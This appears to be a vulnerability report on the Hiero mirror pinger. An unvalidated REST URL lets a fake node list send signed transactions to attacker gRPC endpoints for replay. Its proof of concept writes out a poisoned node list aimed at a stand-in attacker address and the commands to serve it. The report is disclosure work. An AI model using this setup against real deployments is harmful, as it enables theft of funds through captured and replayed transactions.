### Title
Unvalidated `HIERO_MIRROR_PINGER_REST` URL Enables Full Transaction Routing Hijack via Poisoned Node List

### Summary
When `HIERO_MIRROR_PINGER_NETWORK=other`, the `HIERO_MIRROR_PINGER_REST` environment variable is accepted without any URL validation and used verbatim to fetch the gRPC node list. An attacker who controls this variable can point it at an attacker-controlled HTTP server that returns a fabricated node list, causing `hiero.ClientForNetwork()` to build a client whose every `cryptoTransfer.Execute()` call sends fully-signed transactions to attacker-controlled gRPC infrastructure. The signed transactions can then be replayed on the real Hiero network.

### Finding Description

2. `pinger/config.go` lines 133–135 — the only guard is an emptiness check; no scheme enforcement, no hostname allowlist, no TLS requirement: [2](#0-1) 

3. `pinger/sdk_client.go` lines 17–22 — when `network == "other"`, `buildNetworkFromMirrorNodes` is called with the unvalidated URL and its result is passed directly to `hiero.ClientForNetwork`: [3](#0-2) 

4. `pinger/mirror_node_client.go` lines 36–44 — the attacker-supplied base URL is used verbatim to construct the HTTP request URL: [4](#0-3) 

5. `pinger/mirror_node_client.go` lines 100–124 — the JSON response from the attacker's server is parsed and its `service_endpoints` (host + port) are inserted directly into the network map with no integrity check: [5](#0-4) 

6. `pinger/transfer.go` line 33 — every periodic transfer executes against this poisoned client: [6](#0-5) 

**Root cause:** The code assumes the `mirrorRest` URL is a trusted, operator-controlled endpoint. There is no URL scheme enforcement (plain `http://` is the documented example), no TLS certificate pinning, no hostname allowlist, and no cryptographic verification of the returned node list. The node list is the sole source of truth for which gRPC endpoints receive signed transactions.

### Impact Explanation

- **Transaction interception:** Every `cryptoTransfer` is serialized, signed with the operator private key, and sent as a gRPC call to the attacker's server. The attacker receives the complete, valid, signed transaction bytes.
- **Replay on real network:** The attacker can forward or replay those signed transactions against the real Hiero network at will, draining the operator account.
- **Health-monitor blind spot:** The pinger is a liveness/readiness probe for the mirror node. Routing it to a fake network silently breaks the monitoring signal without triggering any alert.
- **Severity: High** — confidentiality of signed transaction content and integrity of fund transfers are both compromised.

### Likelihood Explanation

The precondition — controlling one environment variable — is realistic in several common scenarios: misconfigured Kubernetes `ConfigMap`/`Secret` with overly broad RBAC, a compromised CI/CD pipeline that injects env vars into the container spec, or a shared-namespace container escape. The attacker does not need network-level access to the Hiero nodes themselves; they only need to serve a valid JSON response on an HTTP port. The attack is repeatable on every pinger restart and on every periodic tick.

### Recommendation

1. **Enforce HTTPS:** Reject any `mirrorRest` URL whose scheme is not `https`.
2. **Allowlist the hostname:** Validate `mirrorRest` against a compile-time or operator-supplied allowlist of trusted mirror node hostnames before making any HTTP request.
3. **Pin TLS certificates or use mTLS** for the mirror node HTTP client so a DNS-hijack or MITM cannot substitute a valid-looking certificate.
4. **Verify node-list integrity:** Cross-check the returned node account IDs against a known-good set (e.g., hard-coded for `mainnet`/`testnet`) even in `other` mode, and refuse to start if the returned list is empty or contains only unknown account IDs.
5. **Separate the URL source from the environment:** Read `mirrorRest` from a mounted secret or a signed configuration file rather than a plain environment variable.

### Proof of Concept

```
# 1. Stand up a fake mirror-node HTTP server returning attacker-controlled gRPC endpoints
cat > fake_nodes.json <<'EOF'
{
  "nodes": [{
    "node_account_id": "0.0.3",
    "service_endpoints": [{"ip_address_v4": "203.0.113.1", "port": 50211}],
    "grpc_proxy_endpoint": null
  }],
  "links": {"next": null}
}
EOF
python3 -m http.server 8080 &   # serves fake_nodes.json at /api/v1/network/nodes

# 2. Launch the pinger pointing at the attacker server
export HIERO_MIRROR_PINGER_NETWORK=other
export HIERO_MIRROR_PINGER_REST=http://127.0.0.1:8080
export HIERO_MIRROR_PINGER_OPERATOR_ID=0.0.1234
export HIERO_MIRROR_PINGER_OPERATOR_KEY=<real_operator_key>
export HIERO_MIRROR_PINGER_TO_ACCOUNT_ID=0.0.98
./pinger

# 3. Observe: the pinger calls buildNetworkFromMirrorNodes(), receives the fake node list,
#    builds a client pointing to 203.0.113.1:50211 (attacker gRPC), and every
#    cryptoTransfer.Execute(client) sends a fully-signed transaction to that address.
#    The attacker captures the signed transaction bytes and replays them on the real network.
```
